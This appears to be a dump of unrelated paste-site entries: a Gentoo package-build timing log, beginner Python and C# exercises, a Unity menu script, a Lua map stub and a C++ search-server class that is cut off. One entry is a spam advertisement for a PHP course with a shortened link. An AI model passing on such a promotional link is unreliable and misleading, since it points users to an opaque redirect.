517     8 min 37 secs   Fri Jan 19 06:37:03 2024        71 of 87        sys-fs/e2fsprogs-1.47.0-r2
216     3 min 36 secs   Fri Jan 19 06:40:39 2024        72 of 87        dev-libs/popt-1.19
539     8 min 59 secs   Fri Jan 19 06:49:38 2024        79 of 87        app-portage/portage-utils-0.96.1
1080    18 min 0 secs   Fri Jan 19 07:07:38 2024        73 of 87        net-misc/iputils-20221126-r1
30      0 min 30 secs   Fri Jan 19 07:08:08 2024        78 of 87        sys-apps/openrc-0.48
33      0 min 33 secs   Fri Jan 19 07:08:41 2024        76 of 87        sys-apps/less-643-r1
30      0 min 30 secs   Fri Jan 19 07:09:11 2024        75 of 87        sys-apps/kbd-2.6.4
31      0 min 31 secs   Fri Jan 19 07:09:42 2024        77 of 87        sys-process/procps-4.0.4
41      0 min 41 secs   Fri Jan 19 07:10:23 2024        81 of 87        net-firewall/iptables-1.8.9
29      0 min 29 secs   Fri Jan 19 07:10:52 2024        74 of 87        net-misc/wget-1.21.4
29      0 min 29 secs   Fri Jan 19 07:11:21 2024        84 of 87        app-crypt/gnupg-2.2.41
29      0 min 29 secs   Fri Jan 19 07:11:50 2024        80 of 87        app-editors/nano-7.2-r1
30      0 min 30 secs   Fri Jan 19 07:12:20 2024        82 of 87        net-misc/openssh-9.6_p1-r1
30      0 min 30 secs   Fri Jan 19 07:12:50 2024        83 of 87        sys-apps/man-db-2.12.0
788     13 min 8 secs   Fri Jan 19 07:25:58 2024        85 of 87        dev-build/cmake-3.27.9
242     4 min 2 secs    Fri Jan 19 07:30:00 2024        86 of 87        net-libs/nghttp2-1.57.0
693     11 min 33 secs  Fri Jan 19 07:41:33 2024        87 of 87        net-misc/curl-8.5.0
511     8 min 31 secs   Fri Jan 19 07:50:04 2024        45 of 307       dev-build/autoconf-wrapper-20221207-r1
10      0 min 10 secs   Fri Jan 19 07:50:14 2024        44 of 307       dev-build/automake-wrapper-20221207
10      0 min 10 secs   Fri Jan 19 07:50:24 2024        41 of 307       dev-util/gperf-3.1-r1
13      0 min 13 secs   Fri Jan 19 07:50:37 2024        46 of 307       dev-util/pkgconf-1.8.1
3       0 min 3 secs    Fri Jan 19 07:50:40 2024        40 of 307       app-text/sgml-common-0.6.3-r7
66      1 min 6 secs    Fri Jan 19 07:51:46 2024        42 of 307       dev-build/autoconf-archive-2023.02.20
19      0 min 19 secs   Fri Jan 19 07:52:05 2024        50 of 307       virtual/pkgconfig-2-r1
58      0 min 58 secs   Fri Jan 19 07:53:03 2024        43 of 307       dev-util/re2c-2.2
2152    35 min 52 secs  Fri Jan 19 08:28:55 2024        33 of 307       app-text/manpager-1
28      0 min 28 secs   Fri Jan 19 08:29:23 2024        31 of 307       dev-lang/python-exec-conf-2.4.6
28      0 min 28 secs   Fri Jan 19 08:29:51 2024        1 of 307        sys-devel/gnuconfig-20230731
29      0 min 29 secs   Fri Jan 19 08:30:20 2024        16 of 307       acct-group/cdrom-0-r2
30      0 min 30 secs   Fri Jan 19 08:30:50 2024        13 of 307       sys-apps/baselayout-2.14-r1
29      0 min 29 secs   Fri Jan 19 08:31:19 2024        37 of 307       dev-python/ensurepip-setuptools-69.0.3
27      0 min 27 secs   Fri Jan 19 08:31:46 2024        14 of 307       acct-group/polkitd-0-r2
29      0 min 29 secs   Fri Jan 19 08:32:15 2024        12 of 307       acct-group/root-0-r1
28      0 min 28 secs   Fri Jan 19 08:32:43 2024        18 of 307       acct-group/disk-0-r2
29      0 min 29 secs   Fri Jan 19 08:33:12 2024        19 of 307       acct-group/floppy-0-r1
28      0 min 28 secs   Fri Jan 19 08:33:40 2024        23 of 307       acct-group/lp-0-r2
29      0 min 29 secs   Fri Jan 19 08:34:09 2024        22 of 307       acct-group/kvm-0-r2
29      0 min 29 secs   Fri Jan 19 08:34:38 2024        20 of 307       acct-group/input-0-r2
28      0 min 28 secs   Fri Jan 19 08:35:06 2024        25 of 307       acct-group/sgx-0-r1
29      0 min 29 secs   Fri Jan 19 08:35:35 2024        21 of 307       acct-group/kmem-0-r2
28      0 min 28 secs   Fri Jan 19 08:36:03 2024        26 of 307       acct-group/tape-0-r2
29      0 min 29 secs   Fri Jan 19 08:36:32 2024        39 of 307       net-libs/libmnl-1.0.5
29      0 min 29 secs   Fri Jan 19 08:37:01 2024        28 of 307       acct-group/usb-0-r2
28      0 min 28 secs   Fri Jan 19 08:37:29 2024        34 of 307       acct-group/messagebus-0-r2
29      0 min 29 secs   Fri Jan 19 08:37:58 2024        32 of 307       acct-group/portage-0-r1
29      0 min 29 secs   Fri Jan 19 08:38:27 2024        4 of 307        virtual/libiconv-0-r2
29      0 min 29 secs   Fri Jan 19 08:38:56 2024        8 of 307        acct-group/sshd-0-r2
30      0 min 30 secs   Fri Jan 19 08:39:26 2024        36 of 307       app-crypt/libmd-1.1.0
28      0 min 28 secs   Fri Jan 19 08:39:54 2024        38 of 307       app-misc/editor-wrapper-4-r1
30      0 min 30 secs   Fri Jan 19 08:40:24 2024        30 of 307       sys-apps/install-xattr-0.8-r1
28      0 min 28 secs   Fri Jan 19 08:40:52 2024        15 of 307       acct-group/audio-0-r2
29      0 min 29 secs   Fri Jan 19 08:41:21 2024        24 of 307       acct-group/render-0-r2
29      0 min 29 secs   Fri Jan 19 08:41:50 2024        9 of 307        dev-python/gentoo-common-1
29      0 min 29 secs   Fri Jan 19 08:42:19 2024        7 of 307        acct-group/man-0-r2
28      0 min 28 secs   Fri Jan 19 08:42:47 2024        11 of 307       app-misc/mime-types-2.1.53
28      0 min 28 secs   Fri Jan 19 08:43:15 2024        29 of 307       acct-group/video-0-r2
30      0 min 30 secs   Fri Jan 19 08:43:45 2024        47 of 307       sys-apps/which-2.21
30      0 min 30 secs   Fri Jan 19 08:44:15 2024        17 of 307       acct-group/dialout-0-r2
28      0 min 28 secs   Fri Jan 19 08:44:43 2024        6 of 307        sec-keys/openpgp-keys-gentoo-release-20230329
29      0 min 29 secs   Fri Jan 19 08:45:12 2024        27 of 307       acct-group/tty-0-r2
29      0 min 29 secs   Fri Jan 19 08:45:41 2024        2 of 307        virtual/libintl-0-r2
28      0 min 28 secs   Fri Jan 19 08:46:09 2024        10 of 307       dev-python/ensurepip-pip-23.3.2
31      0 min 31 secs   Fri Jan 19 08:46:40 2024        48 of 307       app-arch/bzip2-1.0.8-r4
29      0 min 29 secs   Fri Jan 19 08:47:09 2024        5 of 307        dev-libs/libffi-3.4.4-r2
29      0 min 29 secs   Fri Jan 19 08:47:38 2024        49 of 307       app-arch/gzip-1.13
29      0 min 29 secs   Fri Jan 19 08:48:07 2024        51 of 307       dev-libs/libpipeline-1.5.7
29      0 min 29 secs   Fri Jan 19 08:48:36 2024        35 of 307       net-dns/c-ares-1.21.0
40      0 min 40 secs   Fri Jan 19 08:49:16 2024        3 of 307        sys-libs/ncurses-6.4_p20230401
112     1 min 52 secs   Fri Jan 19 08:51:08 2024        61 of 307       app-arch/unzip-6.0_p27-r1
185     3 min 5 secs    Fri Jan 19 08:54:13 2024        59 of 307       dev-python/ensurepip-wheels-100
28      0 min 28 secs   Fri Jan 19 08:54:41 2024        56 of 307       acct-user/man-1-r2
30      0 min 30 secs   Fri Jan 19 08:55:11 2024        58 of 307       acct-user/sshd-0-r2
29      0 min 29 secs   Fri Jan 19 08:55:40 2024        63 of 307       app-alternatives/gzip-1
30      0 min 30 secs   Fri Jan 19 08:56:10 2024        55 of 307       acct-user/portage-0-r2
30      0 min 30 secs   Fri Jan 19 08:56:40 2024        52 of 307       acct-user/polkitd-0-r2
29      0 min 29 secs   Fri Jan 19 08:57:09 2024        57 of 307       acct-user/messagebus-0-r2
28      0 min 28 secs   Fri Jan 19 08:57:37 2024        62 of 307       app-alternatives/bzip2-1
32      0 min 32 secs   Fri Jan 19 08:58:09 2024        53 of 307       sys-libs/timezone-data-2023c-r1
29      0 min 29 secs   Fri Jan 19 08:58:38 2024        54 of 307       dev-lang/python-exec-2.4.10
30      0 min 30 secs   Fri Jan 19 08:59:08 2024        60 of 307       sys-libs/readline-8.1_p2-r1
65      1 min 5 secs    Fri Jan 19 09:00:13 2024        64 of 307       virtual/libcrypt-2-r1
62      1 min 2 secs    Fri Jan 19 09:01:15 2024        65 of 307       virtual/os-headers-0-r2
78      1 min 18 secs   Fri Jan 19 09:02:33 2024        66 of 307       sys-apps/gentoo-functions-0.19
79      1 min 19 secs   Fri Jan 19 09:03:52 2024        67 of 307       sys-devel/binutils-config-5.5
63      1 min 3 secs    Fri Jan 19 09:04:55 2024        68 of 307       virtual/acl-0-r2
72      1 min 12 secs   Fri Jan 19 09:06:07 2024        69 of 307       app-alternatives/awk-4
34      0 min 34 secs   Fri Jan 19 09:06:41 2024        70 of 307       sys-apps/diffutils-3.10
75      1 min 15 secs   Fri Jan 19 09:07:56 2024        71 of 307       sys-apps/locale-gen-2.23-r1
68      1 min 8 secs    Fri Jan 19 09:09:04 2024        72 of 307       app-alternatives/ninja-1
76      1 min 16 secs   Fri Jan 19 09:10:20 2024        73 of 307       dev-build/meson-format-array-0
153     2 min 33 secs   Fri Jan 19 09:12:53 2024        74 of 307       app-text/docbook-xsl-stylesheets-1.79.1-r4
70      1 min 10 secs   Fri Jan 19 09:14:03 2024        75 of 307       app-alternatives/lex-0-r1
72      1 min 12 secs   Fri Jan 19 09:15:15 2024        76 of 307       app-alternatives/yacc-1-r2
80      1 min 20 secs   Fri Jan 19 09:16:35 2024        77 of 307       app-text/build-docbook-catalog-2.4
89      1 min 29 secs   Fri Jan 19 09:18:04 2024        78 of 307       app-text/docbook-xml-dtd-4.1.2-r7
62      1 min 2 secs    Fri Jan 19 09:19:06 2024        79 of 307       virtual/perl-ExtUtils-MakeMaker-7.700.0
61      1 min 1 secs    Fri Jan 19 09:20:07 2024        80 of 307       virtual/perl-Encode-3.190.0
62      1 min 2 secs    Fri Jan 19 09:21:09 2024        81 of 307       virtual/perl-Data-Dumper-2.188.0
61      1 min 1 secs    Fri Jan 19 09:22:10 2024        82 of 307       virtual/perl-File-Spec-3.880.0
62      1 min 2 secs    Fri Jan 19 09:23:12 2024        83 of 307       virtual/perl-Carp-1.540.0
62      1 min 2 secs    Fri Jan 19 09:24:14 2024        84 of 307       virtual/perl-Test-Harness-3.440.0-r1
62      1 min 2 secs    Fri Jan 19 09:25:16 2024        85 of 307       virtual/perl-Exporter-5.770.0-r1
62      1 min 2 secs    Fri Jan 19 09:26:18 2024        86 of 307       virtual/perl-Scalar-List-Utils-1.630.0
61      1 min 1 secs    Fri Jan 19 09:27:19 2024        87 of 307       virtual/perl-CPAN-Meta-2.150.10-r7
61      1 min 1 secs    Fri Jan 19 09:28:20 2024        88 of 307       virtual/perl-ExtUtils-CBuilder-0.280.238
61      1 min 1 secs    Fri Jan 19 09:29:21 2024        89 of 307       virtual/perl-ExtUtils-Install-2.220.0
61      1 min 1 secs    Fri Jan 19 09:30:22 2024        90 of 307       virtual/perl-ExtUtils-Manifest-1.730.0-r2
62      1 min 2 secs    Fri Jan 19 09:31:24 2024        91 of 307       virtual/perl-ExtUtils-ParseXS-3.510.0
61      1 min 1 secs    Fri Jan 19 09:32:25 2024        92 of 307       virtual/perl-Getopt-Long-2.540.0
61      1 min 1 secs    Fri Jan 19 09:33:26 2024        93 of 307       virtual/perl-Module-Metadata-1.0.37-r3
61      1 min 1 secs    Fri Jan 19 09:34:27 2024        94 of 307       virtual/perl-Perl-OSType-1.10.0-r7
62      1 min 2 secs    Fri Jan 19 09:35:29 2024        95 of 307       virtual/perl-Text-ParseWords-3.310.0-r1
61      1 min 1 secs    Fri Jan 19 09:36:30 2024        96 of 307       virtual/perl-podlators-5.10.0
61      1 min 1 secs    Fri Jan 19 09:37:31 2024        97 of 307       virtual/perl-version-0.992.900-r1
60      1 min 0 secs    Fri Jan 19 09:38:31 2024        98 of 307       virtual/perl-CPAN-Meta-YAML-0.18.0-r9
62      1 min 2 secs    Fri Jan 19 09:39:33 2024        99 of 307       virtual/perl-JSON-PP-4.160.0-r1
61      1 min 1 secs    Fri Jan 19 09:40:34 2024        100 of 307      virtual/perl-Parse-CPAN-Meta-2.150.10-r7
63      1 min 3 secs    Fri Jan 19 09:41:37 2024        101 of 307      virtual/perl-Unicode-Collate-1.310.0-r1
384     6 min 24 secs   Fri Jan 19 09:48:01 2024        102 of 307      app-arch/xz-utils-5.4.5
158     2 min 38 secs   Fri Jan 19 09:50:39 2024        103 of 307      app-portage/elt-patches-20221210
110     1 min 50 secs   Fri Jan 19 09:52:29 2024        104 of 307      sys-libs/zlib-1.3-r2
265     4 min 25 secs   Fri Jan 19 09:56:54 2024        105 of 307      dev-libs/libpcre2-10.42-r1
240     4 min 0 secs    Fri Jan 19 10:00:54 2024        106 of 307      sys-libs/gdbm-1.23
1764    29 min 24 secs  Fri Jan 19 10:30:18 2024        107 of 307      dev-libs/libunistring-1.1-r1
1540    25 min 40 secs  Fri Jan 19 10:55:58 2024        108 of 307      dev-lang/perl-5.38.2-r1
881     14 min 41 secs  Fri Jan 19 11:10:39 2024        109 of 307      dev-libs/openssl-3.0.12
178     2 min 58 secs   Fri Jan 19 11:13:37 2024        110 of 307      sys-kernel/linux-headers-6.1
167     2 min 47 secs   Fri Jan 19 11:16:24 2024        111 of 307      sys-libs/libseccomp-2.5.5
88      1 min 28 secs   Fri Jan 19 11:17:52 2024        112 of 307      dev-perl/Module-Build-0.423.400
182     3 min 2 secs    Fri Jan 19 11:20:54 2024        113 of 307      dev-libs/libltdl-2.4.7-r1
82      1 min 22 secs   Fri Jan 19 11:22:16 2024        114 of 307      dev-perl/Pod-Parser-1.660.0
80      1 min 20 secs   Fri Jan 19 11:23:36 2024        115 of 307      dev-perl/SGMLSpm-1.1-r2
90      1 min 30 secs   Fri Jan 19 11:25:06 2024        116 of 307      dev-perl/TermReadKey-2.380.0-r1
77      1 min 17 secs   Fri Jan 19 11:26:23 2024        117 of 307      dev-perl/YAML-Tiny-1.740.0
81      1 min 21 secs   Fri Jan 19 11:27:44 2024        118 of 307      dev-perl/MIME-Charset-1.13.1
105     1 min 45 secs   Fri Jan 19 11:29:29 2024        119 of 307      dev-perl/Unicode-LineBreak-2019.1.0
82      1 min 22 secs   Fri Jan 19 11:30:51 2024        120 of 307      dev-perl/Text-CharWidth-0.40.0-r2
77      1 min 17 secs   Fri Jan 19 11:32:08 2024        121 of 307      dev-perl/Text-WrapI18N-0.60.0-r2
191     3 min 11 secs   Fri Jan 19 11:35:19 2024        122 of 307      net-libs/libtirpc-1.3.4
154     2 min 34 secs   Fri Jan 19 11:37:53 2024        123 of 307      net-libs/libnsl-2.0.1
984     16 min 24 secs  Fri Jan 19 11:54:17 2024        124 of 307      sys-libs/pam-1.5.3
183     3 min 3 secs    Fri Jan 19 11:57:20 2024        125 of 307      sys-libs/libcap-2.69
644     10 min 44 secs  Fri Jan 19 12:08:04 2024        126 of 307      sys-apps/util-linux-2.39.2-r1
187     3 min 7 secs    Fri Jan 19 12:11:11 2024        127 of 307      sys-apps/attr-2.5.1-r2
1609    26 min 49 secs  Fri Jan 19 12:38:00 2024        128 of 307      sys-libs/glibc-2.38-r9
358     5 min 58 secs   Fri Jan 19 12:43:58 2024        129 of 307      sys-libs/libxcrypt-4.4.36
443     7 min 23 secs   Fri Jan 19 12:51:21 2024        130 of 307      dev-libs/expat-2.5.0
407     6 min 47 secs   Fri Jan 19 12:58:08 2024        131 of 307      dev-libs/libgpg-error-1.47-r1
445     7 min 25 secs   Fri Jan 19 13:05:33 2024        132 of 307      dev-libs/libxml2-2.11.5-r1
ryzdesk /home/jlpoole/tests/genpi64 #"
ZWL3cSeG,Untitled,Nenogzar,Python,Friday 19th of January 2024 03:50:04 PM CDT,"capacity = 255
current_liters = 0
line = int(input())

for _ in range(line):
    liters = int(input())

    if current_liters + liters <= capacity:
        current_liters += liters
    else:
        print(""Insufficient capacity!"")

print(current_liters)


"""""" I. Shopov""""""

# number_of_lines = int(input())
# tank_capacity = 255
# for line in range(number_of_lines):
#     liters_of_water = int(input())
#     if tank_capacity - liters_of_water < 0:  # No enough volume
#         print(""Insufficient capacity!"")
#         continue
#     tank_capacity -= liters_of_water
# print(255 - tank_capacity)

"""""" CEO """"""

# number_of_pipes = int(input())
#
# capacity = 255
# total_capacity_left = 0
#
# for _ in range(number_of_pipes):
#
#     pipe = int(input())
#
#     if capacity - pipe >= 0:
#         capacity -= pipe
#         total_capacity_left += pipe
#
#     else:
#         print(""Insufficient capacity!"")
#
# print(total_capacity_left)"
w2Y6cLWh,Untitled,sissou123,PHP,Friday 19th of January 2024 03:48:48 PM CDT,"Projects in PHP and MySQL
Master PHP-MySQL by Building 10 Projects 
This is the ultimate course for all web developers who want to learn web programming while building practical projects along with the instructor. This course will help both beginners and experts alike. 
for more:https://cuty.io/QQb33yC0
"
yugmghdW,09.SkiTrip,IvanITD,C#,Friday 19th of January 2024 03:34:32 PM CDT,"int stayDays = int.Parse(Console.ReadLine());
string roomType = Console.ReadLine(); // The option here are, ""room for one person"", ""apartment"" or ""president apartment"".
string grade = Console.ReadLine(); // The options here can be, ""positive"" or ""negative"".

// Here I wrote a code that diminishes the days count, in order to get the right day sum!
// In order to get the days right, we need to count them example: 11 day, but we count 10 nights, because of the stay!
stayDays--; // Minus one day because of the stay!

// Here I create a separate double variable named result, in order late, to be able to print the answer outside the if -else statement!
double result = 0.00;

if (roomType == ""room for one person"")
{
    if (stayDays > 15)
    {
        double roomForOnePerson = 18.00;

        if (grade == ""positive"")
        {
            roomForOnePerson += (roomForOnePerson * 0.25);
            result = roomForOnePerson * stayDays;
        }
        else if (grade == ""negative"")
        {
            roomForOnePerson -= (roomForOnePerson * 0.10);
            result = roomForOnePerson * stayDays;
        }
    }
    else if(stayDays >= 10 && stayDays <= 15)
    {
        double roomForOnePerson = 18.00;
        result = roomForOnePerson * stayDays;

        if (grade == ""positive"")
        {
            roomForOnePerson += (roomForOnePerson * 0.25);
            result = roomForOnePerson * stayDays;
        }
        else if (grade == ""negative"")
        {
            roomForOnePerson -= (roomForOnePerson * 0.10);
            result = roomForOnePerson * stayDays;
        }
    }
    else if (stayDays < 10)
    {
        double roomForOnePerson = 18.00;
        result = roomForOnePerson * stayDays;

        if (grade == ""positive"")
        {
            roomForOnePerson += (roomForOnePerson * 0.25);
            result = roomForOnePerson * stayDays;
        }
        else if (grade == ""negative"")
        {
            roomForOnePerson -= (roomForOnePerson * 0.10);
            result = roomForOnePerson * stayDays;
        }
    }
}
else if (roomType == ""apartment"")
{
    if (stayDays > 15)
    {
        double apartment = 25.00;
        apartment -= (apartment * 0.50);

        if (grade == ""positive"")
        {
            apartment += (apartment * 0.25);
            result = apartment * stayDays;
        }
        else if (grade == ""negative"")
        {
            apartment -= (apartment * 0.10);
            result = apartment * stayDays;
        }
    }
    else if(stayDays >= 10 && stayDays <= 15)
    {
        double apartment = 25.00;
        apartment -= (apartment * 0.35);

        if (grade == ""positive"")
        {
            apartment += (apartment * 0.25);
            result = apartment * stayDays;
        }
        else if (grade == ""negative"")
        {
            apartment -= (apartment * 0.10);
            result = apartment * stayDays;
        }
    }
    else if (stayDays < 10)
    {
        double apartment = 25.00;
        apartment -= (apartment * 0.30);

        if (grade == ""positive"")
        {
            apartment += (apartment * 0.25);
            result = apartment * stayDays;
        }
        else if (grade == ""negative"")
        {
            apartment -= (apartment * 0.10);
            result = apartment * stayDays;
        }
    }
}
else if (roomType == ""president apartment"")
{
    if (stayDays > 15)
    {
        double presidentApartment = 35.00;
        presidentApartment -= (presidentApartment * 0.20);

        if (grade == ""positive"")
        {
            presidentApartment += (presidentApartment * 0.25);
            result = presidentApartment * stayDays;
        }
        else if (grade == ""negative"")
        {
            presidentApartment -= (presidentApartment * 0.10);
            result = presidentApartment * stayDays;
        }
    }
    else if(stayDays >= 10 && stayDays <= 15)
    {
        double presidentApartment = 35.00;
        presidentApartment -= (presidentApartment * 0.15);

        if (grade == ""positive"")
        {
            presidentApartment += (presidentApartment * 0.25);
            result = presidentApartment * stayDays;
        }
        else if (grade == ""negative"")
        {
            presidentApartment -= (presidentApartment * 0.10);
            result = presidentApartment * stayDays;
        }
    }
    else if (stayDays < 10)
    {
        double presidentApartment = 35.00;
        presidentApartment -= (presidentApartment * 0.10);

        if (grade == ""positive"")
        {
            presidentApartment += (presidentApartment * 0.25);
            result = presidentApartment * stayDays;
        }
        else if (grade == ""negative"")
        {
            presidentApartment -= (presidentApartment * 0.10);
            result = presidentApartment * stayDays;
        }
    }    
}

Console.WriteLine($""{result:F2}"");"
XFqpwNLH,Menu Controller,GoodNoodle,C#,Friday 19th of January 2024 03:29:02 PM CDT,"
using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.EventSystems;
using UnityEngine.UI;

public class MenuController : MonoBehaviour
{
    [SerializeField] Button[] menuButtons;
   // [SerializeField] List<TextSlot> theButtons = new List<TextSlot>();

    [SerializeField] BattleSystem BS;

    [SerializeField] GameObject beastUI;
    private void Start()
    {
      ButtonInit();

    }

    private void Update()
    {
        
    }

    void ButtonInit()
    {

        Enter();

        menuButtons[0].onClick.AddListener(() =>
        {
            Debug.Log(""Party clicked"");
            StartCoroutine(BS.GoToPartyState());
            
        });

        menuButtons[1].onClick.AddListener(() => {
            Debug.Log(""item clicked"");
            StartCoroutine(BS.GoToInventoryState());
        });

        menuButtons[3].onClick.AddListener(() => {
    
           
        });

        menuButtons[4].onClick.AddListener(() => {


        });

    }

    public void Enter(int currentButton = 0)
    {
       
        EventSystem.current.SetSelectedGameObject(menuButtons[currentButton].gameObject);
    }

}
"
G22daKsp,blockMap,Larvix,Lua,Friday 19th of January 2024 03:12:23 PM CDT,"local path = {
[""root""] = ""//data/map/"",
}
path.tileset = path.root .. ""blockTileset.txt""
path.data = path.root .. ""blockData.txt""

local data = {[""map""] = {}}

if fs.exists(path.tileset) then
	tileFile = fs.open(path.tileset, ""r"")
    data.tileset = textutils.unserialise(tileFile.readAll())
    tileFile.close()
end

data.load = function()
    if fs.exists(path.data) then
		dataFile = fs.open(path.data, ""r"")
        data.map = textutils.unserialise(dataFile.readAll())
        dataFile.close()
	end
end

local map = {}

map.update = function()
    scanner = peripheral.find(""plethora:scanner"")
    if scanner then
        scan = scanner.scan()
        for i = 1,#scan do
            
		end
    elseif turtle then
        
	end
end

map.draw = function()
    
end"
MWBdYhJq,--------,prizrak567890,C++,Friday 19th of January 2024 02:37:04 PM CDT,"#include <algorithm>
#include <cmath>
#include <iostream>
#include <map>
#include <set>
#include <stdexcept>
#include <string>
#include <utility>
#include <vector>

using namespace std;

const int MAX_RESULT_DOCUMENT_COUNT = 5;

// Функция для чтения строки с консоли
string ReadLine() {
    string s;
    getline(cin, s);
    return s;
}

// Функция для чтения числа из строки
int ReadLineWithNumber() {
    int result;
    cin >> result;
    ReadLine();
    return result;
}

// Функция для разделения текста на слова
vector<string> SplitIntoWords(const string& text) {
    vector<string> words;
    string word;
    for (const char c : text) {
        if (c == ' ') {
            if (!word.empty()) {
                words.push_back(word);
                word.clear();
            }
        }
        else {
            word += c;
        }
    }
    if (!word.empty()) {
        words.push_back(word);
    }

    return words;
}

// Структура для представления документа
struct Document {
    Document() = default;

    Document(int id, double relevance, int rating)
        : id(id)
        , relevance(relevance)
        , rating(rating) {
    }

    int id = 0;
    double relevance = 0.0;
    int rating = 0;
};

// Шаблонная функция для создания уникального множества непустых строк
template <typename StringContainer>
set<string> MakeUniqueNonEmptyStrings(const StringContainer& strings) {
    set<string> non_empty_strings;
    for (const string& str : strings) {
        if (!str.empty()) {
            non_empty_strings.insert(str);
        }
    }
    return non_empty_strings;
}

// Перечисление статусов документа
enum class DocumentStatus {
    ACTUAL,
    IRRELEVANT,
    BANNED,
    REMOVED,
};

// Класс для поиска документов
class SearchServer {
public:
    // Конструктор, принимающий контейнер стоп-слов
    template <typename StringContainer>
    explicit SearchServer(const StringContainer& stop_words)
        : stop_words_(MakeUniqueNonEmptyStrings(stop_words))  // Извлекаем непустые стоп-слова
    {
        if (!all_of(stop_words_.begin(), stop_words_.end(), IsValidWord)) {
            throw invalid_argument(""Some of stop words are invalid""s);
        }
    }

    // Конструктор, принимающий текст стоп-слов
    explicit SearchServer(const string& stop_words_text)
        : SearchServer(
            SplitIntoWords(stop_words_text))  // Вызываем делегирующий конструктор с контейнером строк
    {
    }

    // Метод для добавления документа
    void AddDocument(int document_id, const string& document, DocumentStatus status,
        const vector<int>& ratings) {
        if ((document_id < 0) || (documents_.count(document_id) > 0)) {
            throw invalid_argument(""Invalid document_id""s);
        }
        const auto words = SplitIntoWordsNoStop(document);

        const double inv_word_count = 1.0 / words.size();
        for (const string& word : words) {
            word_to_document_freqs_[word][document_id] += inv_word_count;
        }
        documents_.emplace(document_id, DocumentData{ ComputeAverageRating(ratings), status });
        document_ids_.push_back(document_id);
    }

    // Шаблонный метод для поиска документов по запросу
    template <typename DocumentPredicate>
    vector<Document> FindTopDocuments(const string& raw_query,
        DocumentPredicate document_predicate) const {
        const auto query = ParseQuery(raw_query);

        auto matched_documents = FindAllDocuments(query, document_predicate);

        // Сортируем документы по релевантности и рейтингу
        sort(matched_documents.begin(), matched_documents.end(),
            [](const Document& lhs, const Document& rhs) {
                if (abs(lhs.relevance - rhs.relevance) < 1e-6) {
                    return lhs.rating > rhs.rating;
                }
                else {
                    return lhs.relevance > rhs.relevance;
                }
            });
        if (matched_documents.size() > MAX_RESULT_DOCUMENT_COUNT) {
            matched_documents.resize(MAX_RESULT_DOCUMENT_COUNT);
        }

        return matched_documents;
    }

    // Метод для поиска документов по запросу и статусу
    vector<Document> FindTopDocuments(const string& raw_query, DocumentStatus status) const {
        return FindTopDocuments(
            raw_query, [status](int document_id, DocumentStatus document_status, int rating) {
                return document_status == status;
            });
    }

    // Метод для поиска документов по запросу с учетом статуса ACTUAL
    vector<Document> FindTopDocuments(const string& raw_query) const {
        return FindTopDocuments(raw_query, DocumentStatus::ACTUAL);
    }

    // Метод для получения общего количества документов
    int GetDocumentCount() const {
        return documents_.size();
    }

    // Метод для получения идентификатора документа по индексу
    int GetDocumentId(int index) const {
        return document_ids_.at(index);
    }

    // Метод для поиска совпадений слов в запросе для указанного документа
    tuple<vector<string>, DocumentStatus> MatchDocument(const string& raw_query,
        int document_id) const {
        const auto query = ParseQuery(raw_query);

        vector<string> matched_words;
        for (const string& word : query.plus_words) {
            if (word_to_document_freqs_.count(word) == 0) {
                continue;
            }
            if (word_to_document_freqs_.at(word).count(document_id)) {
                matched_words.push_back(word);
            }
        }
        for (const string& word : query.minus_words) {
            if (word_to_document_freqs_.count(word) == 0) {
                continue;
            }
            if (word_to_document_freqs_.at(word).count(document_id)) {
                matched_words.clear();
                break;
            }
        }
        return { matched_words, documents_.at(document_id).status };
    }

private:
    // Структура данных для хранения информации о документе
    struct DocumentData {
        int rating;
        DocumentStatus status;
    };
    const set<string> stop_words_;
    map<string, map<int, double>> word_to_document_freqs_;
    map<int, DocumentData> documents_;
    vector<int> document_ids_;

    // Метод для проверки, является ли слово стоп-словом
    bool IsStopWord(const string& word) const {
        return stop_words_.count(word) > 0;
    }

    // Проверка, является ли слово допустимым (не содержит спецсимволов)
    static bool IsValidWord(const string& word) {
        // A valid word must not contain special characters
        return none_of(word.begin(), word.end(), [](char c) {
            return c >= '\0' && c < ' ';
            });
    }

    // Разделение текста на слова, исключая стоп-слова и проверяя их допустимость
    vector<string> SplitIntoWordsNoStop(const string& text) const {
        vector<string> words;
        for (const string& word : SplitIntoWords(text)) {
            if (!IsValidWord(word)) {
                throw invalid_argument(""Word ""s + word + "" is invalid""s);
            }
            if (!IsStopWord(word)) {
                words.push_back(word);
            }
        }
        return words;
    }

    // Вычисление среднего рейтинга по вектору рейтингов
    static int ComputeAverageRating(const vector<int>& ratings) {
        if (ratings.empty()) {
            return 0;
        }
        int rating_sum = 0;
        for (const int rating : ratings) {
            rating_sum += rating;
        }
        return rating_sum / static_cast<int>(ratings.size());
    }

    // Структура для представления слова из запроса
    struct QueryWord {
        string data;
        bool is_minus;
        bool is_stop;
    };

    // Анализ слова из запроса
    QueryWord ParseQueryWord(const string& text) const {
        if (text.empty()) {
            throw invalid_argument(""Query word is empty""s);
        }
        string word = text;
        bool is_minus = false;
        if (word[0] == '-') {
            is_minus = true;
            word = word.substr(1);
        }
        if (word.empty() || word[0] == '-' || !IsValidWord(word)) {
            throw invalid_argument(""Query word ""s + text + "" is invalid"");
        }

        return { word, is_minus, IsStopWord(word) };
    }

    // Структура для представления запроса
    struct Query {
        set<string> plus_words;
        set<string> minus_words;
    };
    // Анализ запроса
    Query ParseQuery(const string& text) const {
        Query result;
        for (const string& word : SplitIntoWords(text)) {
            const auto query_word = ParseQueryWord(word);
            if (!query_word.is_stop) {
                if (query_word.is_minus) {
                    result.minus_words.insert(query_word.data);
                }
                else {
                    result.plus_words.insert(query_word.data);
                }
            }
        }
        return result;
    }

    // Вычисление обратной частоты документов для слова
    double ComputeWordInverseDocumentFreq(const string& word) const {
        return log(GetDocumentCount() * 1.0 / word_to_document_freqs_.at(word).size());
    }

    // Поиск всех документов, соответствующих запросу с учетом предиката
    template <typename DocumentPredicate>
    vector<Document> FindAllDocuments(const Query& query,
        DocumentPredicate document_predicate) const {
        map<int, double> document_to_relevance;
        for (const string& word : query.plus_words) {
            if (word_to_document_freqs_.count(word) == 0) {
                continue;
            }
            const double inverse_document_freq = ComputeWordInverseDocumentFreq(word);
            for (const auto [document_id, term_freq] : word_to_document_freqs_.at(word)) {
                const auto& document_data = documents_.at(document_id);
                if (document_predicate(document_id, document_data.status, document_data.rating)) {
                    document_to_relevance[document_id] += term_freq * inverse_document_freq;
                }
            }
        }

        for (const string& word : query.minus_words) {
            if (word_to_document_freqs_.count(word) == 0) {
                continue;
            }
